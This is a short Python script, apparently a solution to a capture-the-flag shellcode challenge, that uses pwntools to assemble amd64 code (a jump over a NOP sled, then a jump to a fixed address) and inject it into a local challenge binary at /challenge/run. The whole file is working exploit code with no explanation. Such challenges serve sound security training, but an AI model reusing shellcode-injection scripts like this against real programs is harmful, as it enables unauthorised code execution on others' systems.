import pwn
pwn.context.update(arch="amd64")
code = pwn.asm("""
jmp label
"""
+
"nop\n" * 0x51
+
"""
label:
pop rdi
mov rax, 0x403000
jmp rax
""" )
process = pwn.process("/challenge/run")
process.write(code)
print(process.readall())
